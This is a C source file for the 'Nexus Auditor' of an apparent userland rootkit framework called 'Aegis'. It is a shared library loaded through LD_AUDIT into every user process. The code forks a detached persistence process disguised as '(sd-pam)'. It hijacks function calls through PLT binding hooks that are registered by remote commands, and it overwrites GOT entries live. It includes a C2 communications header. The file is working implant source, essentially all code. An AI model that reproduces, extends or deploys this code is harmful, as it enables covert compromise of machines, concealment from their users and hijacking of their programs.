/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Nexus Auditor (LD_AUDIT Shared Library)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nexus_auditor/nexus_auditor.c
 *  Purpose        : The heart of the Aegis framework.  This shared library
 *                   is loaded by the GNU dynamic linker via LD_AUDIT into
 *                   every user process.  It implements the rtld-audit(7)
 *                   interface to hook the linker's internal machinery:
 *
 *                   - la_version:     Negotiate audit interface version
 *                   - la_objopen:     Called when each shared object loads
 *                   - la_symbind64:   Called for every symbol binding (PLT)
 *                   - la_preinit:     Called before main() — our entry point
 *                   - la_activity:    Called on linker state changes
 *
 *                   On load, the auditor performs Alpha/Beta node election
 *                   via flock() on a semaphore file.  The Alpha node becomes
 *                   the IPC command server; all others become Beta nodes.
 *
 *  Compilation    : gcc -shared -fPIC -o nexus_auditor.so nexus_auditor.c
 *                   alpha_node.c beta_node.c -lpthread -lcrypto
 * ============================================================================
 */

#define _GNU_SOURCE 1

#include "../c2_comms/crypto.h"
#include "../common/config.h"
#include "../common/logging.h"
#include "../common/types.h"
#include "ipc_protocol.h"


#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <link.h> /* link_map, for LD_AUDIT interface */
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h> /* flock */
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>


/* ── Forward Declarations ────────────────────────────────────────────────── */

/* From alpha_node.c */
extern aegis_result_t alpha_node_start(aegis_log_ctx_t *log,
                                       aegis_crypto_ctx_t *crypto);
extern void alpha_node_stop(void);

/* From beta_node.c */
extern aegis_result_t beta_node_start(aegis_log_ctx_t *log,
                                      aegis_crypto_ctx_t *crypto);
extern void beta_node_stop(void);

/* ── Global State ────────────────────────────────────────────────────────── */

static aegis_node_type_t g_node_type = NODE_UNINITIALIZED;
static aegis_log_ctx_t *g_log = NULL;
static aegis_crypto_ctx_t g_crypto;
static int g_lock_fd = -1;
static bool g_initialized = false;
static pthread_once_t g_init_once = PTHREAD_ONCE_INIT;

/* Maximum number of hooks we can track per process */
#define MAX_HOOKS 64
static aegis_hook_entry_t g_hooks[MAX_HOOKS];
static int g_hook_count = 0;
static pthread_mutex_t g_hook_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ── Internal: Hydra Anchor Spawning ─────────────────────────────────────── */

extern char **environ;

static void spawn_anchor_process(void) {
  pid_t pid = fork();
  if (pid < 0)
    return;
  if (pid > 0)
    return; /* Parent returns */

  /* Child: detach and become the Anchor */
  setsid();

  /* Mark ourselves as the Anchor */
  setenv("AEGIS_ANCHOR", "1", 1);

  /* Close standard FDs to detach from terminal */
  int devnull = open("/dev/null", O_RDWR);
  if (devnull >= 0) {
    dup2(devnull, 0);
    dup2(devnull, 1);
    dup2(devnull, 2);
    if (devnull > 2)
      close(devnull);
  }

  /*
   * masquerade as a legitimate session process (sd-pam).
   * We use /bin/sleep infinity to stay alive with minimal resource usage.
   * LD_AUDIT is inherited from environ.
   */
  char *argv[] = {"(sd-pam)", "infinity", NULL};
  execve("/bin/sleep", argv, environ);

  /* If execve fails, exit */
  exit(0);
}

/* ── Internal: Node Election via flock ───────────────────────────────────── */

static aegis_node_type_t elect_node(void) {
  const char *home = getenv("HOME");
  if (!home)
    return NODE_BETA; /* Can't determine, default to Beta */

  char lock_path[512];
  snprintf(lock_path, sizeof(lock_path), "%s/%s", home, AEGIS_LOCK_FILENAME);

  /* Create the lock file's parent directory */
  char lock_dir[512];
  snprintf(lock_dir, sizeof(lock_dir), "%s", lock_path);
  char *slash = strrchr(lock_dir, '/');
  if (slash) {
    *slash = '\0';
    mkdir(lock_dir, 0700);
  }

  g_lock_fd = open(lock_path, O_RDWR | O_CREAT, 0600);
  if (g_lock_fd < 0)
    return NODE_BETA;

  /*
   * Attempt exclusive lock (non-blocking).
   * First process to succeed = Alpha node.
   * All others = Beta nodes.
   */
  if (flock(g_lock_fd, LOCK_EX | LOCK_NB) == 0) {
    /* We acquired the lock. Check if we are the designated Anchor. */
    const char *is_anchor = getenv("AEGIS_ANCHOR");

    if (is_anchor && strcmp(is_anchor, "1") == 0) {
      /* We are the Anchor — proceed as Alpha */
      char pid_str[32];
      int n = snprintf(pid_str, sizeof(pid_str), "%d\n", (int)getpid());
      if (ftruncate(g_lock_fd, 0) == 0) {
        lseek(g_lock_fd, 0, SEEK_SET);
        if (write(g_lock_fd, pid_str, n) != n) {
          /* Ignored write error */
        }
      }

      /* Clear the env var so children don't inherit it blindly */
      unsetenv("AEGIS_ANCHOR");

      return NODE_ALPHA;
    } else {
      /*
       * We are a transient process (e.g. ls, bash).
       * Pass the torch to a dedicated background Anchor.
       */
      spawn_anchor_process();

      /* Release the lock and downgrade to Beta */
      flock(g_lock_fd, LOCK_UN);
      close(g_lock_fd);
      g_lock_fd = -1;

      return NODE_BETA;
    }
  }

  /* Lock failed — we are a Beta node */
  close(g_lock_fd);
  g_lock_fd = -1;
  return NODE_BETA;
}

/* ── Internal: Initialization (called once via pthread_once) ─────────────── */

static void auditor_init(void) {
  if (g_initialized)
    return;

  const char *home = getenv("HOME");
  if (!home)
    return;

  /* Initialize logging */
  char log_path[512];
  snprintf(log_path, sizeof(log_path), "%s/%s", home, AEGIS_LOG_REL_PATH);
  g_log = aegis_log_init(log_path, 0);

  /* Initialize crypto */
  aegis_result_t rc = aegis_crypto_init(&g_crypto, NULL);
  if (rc != AEGIS_OK) {
    aegis_log_event(g_log, LOG_CAT_AUDITOR, LOG_SEV_CRITICAL,
                    "Crypto init failed (rc=%d)", rc);
    return;
  }

  /* Perform node election */
  g_node_type = elect_node();

  aegis_log_event(g_log, LOG_CAT_AUDITOR, LOG_SEV_INFO,
                  "Node election complete: %s (pid=%d, comm=%s)",
                  (g_node_type == NODE_ALPHA) ? "ALPHA" : "BETA", (int)getpid(),
                  program_invocation_short_name);

  /* Start the appropriate node role */
  if (g_node_type == NODE_ALPHA) {
    rc = alpha_node_start(g_log, &g_crypto);
    if (rc != AEGIS_OK) {
      aegis_log_event(g_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                      "Alpha node start failed (rc=%d)", rc);
    }
  } else {
    rc = beta_node_start(g_log, &g_crypto);
    if (rc != AEGIS_OK) {
      aegis_log_event(g_log, LOG_CAT_BETA, LOG_SEV_ERROR,
                      "Beta node start failed (rc=%d)", rc);
    }
  }

  g_initialized = true;
}

/* ── Internal: Cleanup ───────────────────────────────────────────────────── */

static void auditor_cleanup(void) {
  if (!g_initialized)
    return;

  if (g_node_type == NODE_ALPHA) {
    alpha_node_stop();
    if (g_lock_fd >= 0) {
      flock(g_lock_fd, LOCK_UN);
      close(g_lock_fd);
      g_lock_fd = -1;
    }
  } else {
    beta_node_stop();
  }

  aegis_crypto_destroy(&g_crypto);

  if (g_log) {
    aegis_log_event(
        g_log, LOG_CAT_AUDITOR, LOG_SEV_INFO,
        "=== Nexus Auditor shutting down (pid=%d) ===", (int)getpid());
    aegis_log_finalize(g_log);
    g_log = NULL;
  }

  g_initialized = false;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  LD_AUDIT INTERFACE IMPLEMENTATION
 *
 *  These are the callbacks the GNU dynamic linker (ld.so) invokes.
 *  They give us unprecedented control over the linking process.
 *  Reference: rtld-audit(7)
 * ═══════════════════════════════════════════════════════════════════════════
 */

/*
 * la_version — Called first.  We return the audit interface version
 * we support (LAV_CURRENT) and receive a pointer to the audit cookie.
 */
unsigned int la_version(unsigned int version) {
  (void)version;
  /*
   * Trigger one-time initialization on the very first la_version call.
   * This happens before any shared object is loaded, giving us
   * maximum control.
   */
  pthread_once(&g_init_once, auditor_init);
  return LAV_CURRENT;
}

/*
 * la_objopen — Called when each shared object is loaded.
 * We receive the link_map and can decide which objects to audit.
 *
 * Return flags:
 *   LA_FLG_BINDTO   — audit symbol bindings TO this object
 *   LA_FLG_BINDFROM — audit symbol bindings FROM this object
 */
unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
  (void)cookie;
  if (!g_initialized || !g_log)
    return 0;

  const char *name = map->l_name;
  if (!name || name[0] == '\0')
    name = "(main)";

  aegis_log_transform(g_log, LOG_CAT_AUDITOR, "objopen", name,
                      (void *)(uintptr_t)map->l_addr, NULL, 0,
                      "Shared object loaded: base=0x%lx lmid=%ld",
                      (unsigned long)map->l_addr, (long)lmid);

  /*
   * Request symbol binding auditing for all objects.
   * This lets la_symbind64 intercept every PLT resolution.
   */
  return LA_FLG_BINDTO | LA_FLG_BINDFROM;
}

/*
 * la_symbind64 — Called for every symbol binding (PLT lazy resolution).
 * This is the most powerful callback: we can intercept and redirect
 * ANY function call that goes through the PLT.
 *
 * @sym:        Symbol information
 * @ndx:        Symbol index
 * @refcook:    Cookie of the referring object
 * @defcook:    Cookie of the defining object
 * @flags:      Binding flags (in/out)
 * @symname:    Symbol name string
 *
 * Return: The address the symbol should resolve to.
 *         Return sym->st_value for normal resolution.
 *         Return a different address to redirect the call.
 */
uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx, uintptr_t *refcook,
                       uintptr_t *defcook, unsigned int *flags,
                       const char *symname) {
  (void)ndx;
  (void)refcook;
  (void)defcook;
  (void)flags;
  if (!g_initialized || !symname)
    return sym->st_value;

  /*
   * Check if we have a registered hook for this symbol.
   * The hook table is populated by Alpha node commands (CMD_HOOK_FUNCTION).
   */
  pthread_mutex_lock(&g_hook_mutex);

  for (int i = 0; i < g_hook_count; i++) {
    if (g_hooks[i].active && strcmp(g_hooks[i].target_func, symname) == 0) {

      uintptr_t original = sym->st_value;
      g_hooks[i].original_addr = (void *)original;

      aegis_log_hook(g_log, g_hooks[i].target_lib, symname, (void *)original,
                     g_hooks[i].hook_addr,
                     NULL, /* GOT slot determined at bind time */
                     true);

      pthread_mutex_unlock(&g_hook_mutex);

      /* Return our hook address instead of the real one */
      return (uintptr_t)g_hooks[i].hook_addr;
    }
  }

  pthread_mutex_unlock(&g_hook_mutex);

  /* No hook registered — normal resolution */
  return sym->st_value;
}

/*
 * la_preinit — Called after all shared objects are loaded but before
 * main() is called.  This is our window to perform any setup that
 * requires all libraries to be present.
 */
void la_preinit(uintptr_t *cookie) {
  (void)cookie;
  if (!g_initialized)
    return;

  aegis_log_event(g_log, LOG_CAT_AUDITOR, LOG_SEV_INFO,
                  "la_preinit: all objects loaded, main() imminent "
                  "(pid=%d)",
                  (int)getpid());
}

/*
 * la_activity — Called when the linker's state changes.
 * flag values: LA_ACT_CONSISTENT, LA_ACT_ADD, LA_ACT_DELETE
 */
void la_activity(uintptr_t *cookie, unsigned int flag) {
  (void)cookie;
  if (!g_initialized || !g_log)
    return;

  const char *flag_str = "UNKNOWN";
  switch (flag) {
  case LA_ACT_CONSISTENT:
    flag_str = "CONSISTENT";
    break;
  case LA_ACT_ADD:
    flag_str = "ADD";
    break;
  case LA_ACT_DELETE:
    flag_str = "DELETE";
    break;
  }

  aegis_log_event(g_log, LOG_CAT_AUDITOR, LOG_SEV_TRACE,
                  "la_activity: linker state change: %s", flag_str);
}

/* ── Hook Management API (called by Alpha/Beta nodes) ────────────────────── */

/*
 * Register a new function hook.  When la_symbind64 encounters this
 * symbol during PLT resolution, it will redirect to hook_addr.
 */
aegis_result_t nexus_register_hook(const char *lib, const char *func,
                                   void *hook_addr) {
  pthread_mutex_lock(&g_hook_mutex);

  if (g_hook_count >= MAX_HOOKS) {
    pthread_mutex_unlock(&g_hook_mutex);
    return AEGIS_ERR_HOOK;
  }

  aegis_hook_entry_t *entry = &g_hooks[g_hook_count];
  memset(entry, 0, sizeof(*entry));
  strncpy(entry->target_lib, lib, sizeof(entry->target_lib) - 1);
  strncpy(entry->target_func, func, sizeof(entry->target_func) - 1);
  entry->hook_addr = hook_addr;
  entry->active = true;

  g_hook_count++;

  aegis_log_event(g_log, LOG_CAT_AUDITOR, LOG_SEV_INFO,
                  "Hook registered: %s::%s -> %p (slot %d)", lib, func,
                  hook_addr, g_hook_count - 1);

  pthread_mutex_unlock(&g_hook_mutex);
  return AEGIS_OK;
}

/*
 * Remove a registered hook, restoring normal symbol resolution.
 */
aegis_result_t nexus_remove_hook(const char *lib, const char *func) {
  pthread_mutex_lock(&g_hook_mutex);

  for (int i = 0; i < g_hook_count; i++) {
    if (g_hooks[i].active && strcmp(g_hooks[i].target_lib, lib) == 0 &&
        strcmp(g_hooks[i].target_func, func) == 0) {

      aegis_log_hook(g_log, g_hooks[i].target_lib, g_hooks[i].target_func,
                     g_hooks[i].original_addr, g_hooks[i].hook_addr,
                     g_hooks[i].got_entry, false);

      g_hooks[i].active = false;
      pthread_mutex_unlock(&g_hook_mutex);
      return AEGIS_OK;
    }
  }

  pthread_mutex_unlock(&g_hook_mutex);
  return AEGIS_ERR_HOOK;
}

/*
 * Perform a live GOT overwrite to redirect an already-resolved function.
 * This is used when la_symbind64 has already been called (symbol is cached).
 *
 * The approach:
 * 1. Parse /proc/self/maps to find the GOT region
 * 2. Locate the GOT entry for the target function
 * 3. Overwrite it with our hook address
 */
aegis_result_t nexus_hot_patch_got(const char *lib, const char *func,
                                   void *hook_addr) {
  /* Find the target library's link_map */
  void *handle = dlopen(lib, RTLD_NOLOAD | RTLD_LAZY);
  if (!handle) {
    aegis_log_event(g_log, LOG_CAT_AUDITOR, LOG_SEV_ERROR,
                    "GOT patch: library not loaded: %s", lib);
    return AEGIS_ERR_HOOK;
  }

  /* Get the original function address */
  void *orig_addr = dlsym(handle, func);
  if (!orig_addr) {
    dlclose(handle);
    return AEGIS_ERR_HOOK;
  }

  /*
   * Scan the GOT for entries pointing to orig_addr.
   * We parse /proc/self/maps to find writable segments that could
   * contain the GOT, then scan for pointers matching orig_addr.
   */
  FILE *maps = fopen("/proc/self/maps", "r");
  if (!maps) {
    dlclose(handle);
    return AEGIS_ERR_SYSCALL;
  }

  char line[512];
  aegis_result_t result = AEGIS_ERR_HOOK;

  while (fgets(line, sizeof(line), maps)) {
    /* Look for writable segments */
    if (!strstr(line, "rw-p") && !strstr(line, "rw-s"))
      continue;

    unsigned long start, end;
    if (sscanf(line, "%lx-%lx", &start, &end) != 2)
      continue;

    /* Scan this region for GOT entries pointing to our target */
    uintptr_t *scan = (uintptr_t *)start;
    size_t entries = (end - start) / sizeof(uintptr_t);

    for (size_t i = 0; i < entries; i++) {
      if (scan[i] == (uintptr_t)orig_addr) {
        /* Found a GOT entry — overwrite it */

        /* Make the page writable (it should already be, but safety) */
        void *page = (void *)((uintptr_t)&scan[i] & ~4095UL);
        mprotect(page, 4096, PROT_READ | PROT_WRITE);

        /* Save the original for potential unhooking */
        void *got_entry = &scan[i];

        /* Perform the overwrite */
        scan[i] = (uintptr_t)hook_addr;

        aegis_log_hook(g_log, lib, func, orig_addr, hook_addr, got_entry, true);

        aegis_log_transform(g_log, LOG_CAT_AUDITOR, "got_overwrite", func,
                            orig_addr, hook_addr, sizeof(uintptr_t),
                            "GOT at %p: 0x%lx -> 0x%lx", got_entry,
                            (unsigned long)(uintptr_t)orig_addr,
                            (unsigned long)(uintptr_t)hook_addr);

        result = AEGIS_OK;
        /* Don't break — there may be multiple GOT entries */
      }
    }
  }

  fclose(maps);
  dlclose(handle);
  return result;
}

/* ── Constructor / Destructor ────────────────────────────────────────────── */

AEGIS_CONSTRUCTOR
static void nexus_constructor(void) {
  /* Ensure initialization happens even if la_version isn't called */
  pthread_once(&g_init_once, auditor_init);
}

AEGIS_DESTRUCTOR
static void nexus_destructor(void) { auditor_cleanup(); }
